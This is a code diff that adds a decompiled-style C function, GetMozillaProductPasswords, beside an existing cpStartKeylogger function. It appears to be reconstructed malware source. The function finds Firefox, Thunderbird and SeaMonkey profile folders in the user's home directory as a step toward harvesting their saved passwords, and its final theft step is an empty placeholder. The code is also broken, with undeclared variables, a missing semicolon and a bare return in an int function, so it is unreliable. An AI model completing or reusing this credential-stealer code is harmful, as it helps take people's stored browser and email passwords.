@@ -988,3 +988,61 @@ int32_t  __attribute__((cdecl)) cpStartKeylogger () {
 	...
 
 }
+
+
+int32_t  __attribute__((cdecl)) GetMozillaProductPasswords (int32_t arg_0) {
+
+	char * homepath;
+	char * profile_file_name;
+
+	if (arg_0 == 6) {
+
+		if ( LoadMozillaLib() ) 
+			return -1;
+		
+
+		// Get the environment variable path
+		homepath = getenv("HOME");
+
+		// Initialize a string
+		__snprintf_chk(&v39, 4352, 1, 4352, "%s/.mozilla/seamonkey/profiles.ini", homepath);
+
+		// Parses the profiles.ini file and extract the file name
+		if ( ExtractProfileName((int)&v39, &v43, 64) ) {
+
+		}
+
+	 	goto LABEL_13;
+	}
+
+	if (arg_0 == 2) {
+
+		__snprintf_chk(&v39, 4352, 1, 4352, "%s/.thunderbird/profiles.ini", v4)
+
+		// Once again, the steps executed above are the same, just for thunderbird
+		if ( ExtractProfileName((int)&v39, &v43, 64) ) {
+			__snprintf_chk(&v39, 4352, 1, 4352, "%s/.thunderbird/%s", v5, &v43);
+		}
+	}
+
+	if (arg_0 == 1) {
+		
+		__snprintf_chk(&v39, 4352, 1, 4352, "%s/.mozilla/firefox/profiles.ini", homepath);
+
+		if ( ExtractProfileName((int)&v39, &v43, 64) ) {
+			__snprintf_chk(&v39, 4352, 1, 4352, "%s/.mozilla/firefox/%s", v3, &v43);
+		}
+
+	}
+
+
+LABEL_13:
+
+	CleanUpMozilla ();
+	return ;
+
+LABEL_44:
+	
+	// Do the actual thing
+
+}
